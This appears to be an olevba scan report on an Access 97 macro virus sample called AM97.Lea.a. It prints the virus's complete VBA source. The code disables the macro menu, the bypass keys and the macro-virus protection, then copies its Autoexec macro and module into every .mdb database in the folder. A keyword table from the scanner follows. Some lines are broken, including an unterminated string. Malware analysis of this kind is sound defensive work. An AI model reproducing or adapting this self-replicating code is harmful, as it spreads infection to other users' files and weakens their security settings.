olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Source-aa425b112cc5ff0df9c19402cb276f49c12b0ee1
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSOffice.Source-aa425b112cc5ff0df9c19402cb276f49c12b0ee1 
in file: Virus.MSOffice.Source-aa425b112cc5ff0df9c19402cb276f49c12b0ee1 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Compare Database
Option Explicit
Function  Lea()
'AM97.Lea.a
'by -KD- / [Metaphase VX Team] & [NoMercyVirusTeam]
On Error Resume Next
CommandBars("tools").Controls("Macro").Delete
CurrentDb.Properties("AllowBypassKey") = False
CurrentDb.Properties("AllowSpecialKeys") = False
CurrentDb.Properties("AllowBreakIntoCode") = False
Application.DisplayStatusBar = False
Application.DisplayAlerts = False
Application.MacrovirusProtection = False
Dim FilesToGet, FilesToInfect, CodeBase As String
FilesToInfect = False
FilesToGet = Dir("*.mdb", vbNormal)
If FilesToGet <> "" Then
CodeBase = CurrentDb.Name
If CodeBase = FilesToGet Then FilesToInfect = True
If FilesToInfect = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", FilesToGet, acMacro, "Autoexec", "Autoexec"
If FilesToInfect = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", FilesToGet, acModule, "lea", "lea"
While FilesToGet <> "
FilesToGet = Dir
If CodeBase = FilesToGet Then FilesToInfect = True
If FilesToInfect = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", FilesToGet, acMacro, "Autoexec", "Autoexec"
If FilesToInfect = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", FilesToGet, acModule, "lea", "lea"
Wend
On Error GoTo Exit_Payload
If Day(Now()) = Int(Rnd() * 3) + 1 Then
MsgBox "AM97.Lea.a", "Welcome to this place, I'll Show you everything. With arms wide open."
End If
Exit_Payload:
End If
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|Suspicious|open                |May open a file                              |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

